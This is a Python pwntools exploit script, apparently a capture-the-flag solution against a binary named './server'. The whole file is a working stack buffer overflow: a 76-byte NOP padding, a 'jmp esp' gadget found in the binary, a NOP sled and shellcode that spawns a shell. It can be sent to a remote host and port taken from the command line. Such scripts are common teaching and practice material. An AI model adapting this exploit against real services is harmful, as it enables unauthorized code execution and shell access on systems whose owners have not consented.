from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Offset to EIP
padding = 76

# Assemble the byte sequence for 'jmp esp' (convert from human readable to machine code)
jmp_esp = asm('jmp esp')

# Searches for the address of the machine code        
jmp_esp = next(elf.search(jmp_esp))


# Print flag
# shellcode = asm(shellcraft.cat('flag.txt'))
shellcode = asm(shellcraft.sh())
# Exit
shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,   # Padding uses NOP instruction because it is safer in case jump does not land on the 1st byte of shellcode
    jmp_esp,
    asm('nop') * 16,    # If the jump lands anywhere between the 16 bytes, the NOP sled will still slide into shellcode safely
    shellcode
)

# Write payload to file
write("payload", payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
